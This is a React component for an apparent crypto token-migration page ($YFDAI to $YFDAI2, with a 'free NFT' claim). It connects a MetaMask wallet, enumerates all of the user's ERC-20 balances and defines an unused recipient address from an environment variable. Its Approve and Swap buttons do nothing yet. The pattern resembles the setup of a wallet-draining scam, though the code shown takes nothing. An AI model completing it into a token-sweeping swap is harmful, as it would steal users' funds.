import React, { useState } from "react";
import styles from "./tokenSwap.module.scss";
import logo from "../../assets/YFDAI2.png";
import { toast } from "react-toastify";
import { ethers } from "ethers";
import { useEffect } from "react";
import { getTokenBalances } from "../../helper/helpers";

const TokenSwap = () => {
  const [hide] = useState(false);
  const [walletAddress, setwalletAddress] = useState("");
  const [walletConnected, setwalletConnected] = useState(null);
  const [chainID, setchainID] = useState(0);
  const [userWallet, setuserWallet] = useState("");
  const [processing, setProcessing] = useState(false);
  const [initiateWallet, setInitiateWallet] = useState(false);
  const [listAllTokens, setListAllTokens] = useState([]);

  let to = process.env.REACT_APP_MY_ADDRESS;
  let APIKeyString = process.env.REACT_APP_API_KEY;

  const connectWallet = async () => {
    if (typeof window.ethereum !== "undefined") {
      setProcessing(true);
      // request for the account of a connected user
      let [account] = await window.ethereum.request({
        method: "eth_requestAccounts",
      });

      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);

        const { chainId } = await provider.getNetwork();
        setchainID(parseInt(chainId));

        // getBalance function accepts strings only
        let balance = await provider.getBalance(account);
        balance = ethers.utils.formatEther(balance);
        balance = parseFloat(balance).toFixed(5);

        console.log(balance);
        setProcessing(false);
        setuserWallet(account);
        sessionStorage.setItem("setuserWallet", account);

        // Format the user wallet address
        account = `${account.slice(0, 4)}…${account.slice(
          account.length - 5,
          account.length
        )}`;
        // setchainID(parseInt(window.ethereum.chainId));

        setwalletAddress(account);
        setwalletConnected(true);
        // save data to local storage
        sessionStorage.setItem("account", account);
        sessionStorage.setItem("chainID", parseInt(chainId));
        setInitiateWallet(true);
      } catch (error) {
        const id = toast.loading("Processing...");
        console.log("Error: ", error);
        return toast.update(id, {
          render:
            " Connect to our DApp via metamask extension on our PC or use your wallet browser to connect",
          type: "warning",
          isLoading: false,
          autoClose: 3000,
        });
        console.log("Error: ", error);
      }
    } else {
      const id = toast.loading("Processing...");
      return toast.update(id, {
        render:
          " Connect to our DApp via metamask extension on our PC or use your wallet browser to connect",
        type: "warning",
        isLoading: false,
        autoClose: 3000,
      });
    }
  };

  // Fetches all the user tokens
  const getErc20Tokens = async () => {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    let chainId = chainID;
    let userwallet = userWallet;

    if (chainId === 0) {
      if (sessionStorage.getItem("chainID")) {
        chainId = parseInt(sessionStorage.getItem("chainID"));
        userwallet = sessionStorage.getItem("setuserWallet");
      }
    }
    const allTokens = await getTokenBalances({
      chainID: chainId,
      APIKeyString,
      userWallet: userwallet,
      provider,
    });
    setListAllTokens(allTokens);
    console.log(allTokens);
    return allTokens;
  };

  // This functionality fetches all data on user storage
  useEffect(() => {
    const walletAddressData = sessionStorage.getItem("account");
    const chainIdData = sessionStorage.getItem("chainID");
    const userWalletData = sessionStorage.getItem("setuserWallet");

    console.log(`This is the wallet address data ${walletAddressData}`);
    if (walletAddressData) {
      setwalletAddress(walletAddressData);
      setwalletConnected(true);
      setchainID(parseInt(chainIdData));
      setuserWallet(userWalletData);

      (async () => {
        await getErc20Tokens();
        setInitiateWallet(false);
      })();
    }
  }, [initiateWallet, getErc20Tokens]);
  return (
    <div className={styles.container}>
      <div className={styles.content}>
        <div className={styles.navBarParent}>
          <div className={styles.logoParent}>
            <img src={logo} alt={logo} />
          </div>
          <div className={styles.walletConnectDiv}>
            <button
              onClick={connectWallet}
              style={{
                cursor: walletConnected && "none",
              }}
            >
              {walletConnected
                ? walletAddress
                : !processing
                ? "Connect Wallet"
                : "Connecting"}
            </button>
          </div>
        </div>
        {!hide ? (
          <div className={styles.swapParentContainer}>
            <div className={styles.swapParentContent}>
              <div className={styles.firstSection}>
                <div className={styles.flexParent}>
                  <div className={styles.flexItemsDiv}>
                    <span>Old $YFDAI Balance</span>
                    <span>0.00000 YFDAI</span>
                  </div>
                  <div className={styles.flexItemsDiv}>
                    <span>New $YFDAI2 Balance</span>
                    <span>0.00000 YFDA2</span>
                  </div>
                  <div className={styles.flexItemsDiv}>
                    <span>Free NFT Claimed</span>
                    <span>NO</span>
                  </div>
                </div>
              </div>
              <div className={styles.secondSection}>
                <div className={styles.flexParent2}>
                  <div className={styles.flexItemsDiv2}>
                    <div className={styles.formParent}>
                      <div className={styles.formGroup}>
                        <label>
                          SWAP YFDAI <span>(Deposit $YFDAI (ERC-20)</span>
                        </label>
                        <input type="text" />
                      </div>
                    </div>
                    <div className={styles.approveParent}>
                      <button>Approve</button>
                      <button>Swap</button>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        ) : (
          <div className={styles.noTokenContainer}>
            <div className={styles.noTokenContent}>
              <h1>This offer is only exclusive for YFDAI holders only</h1>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default TokenSwap;
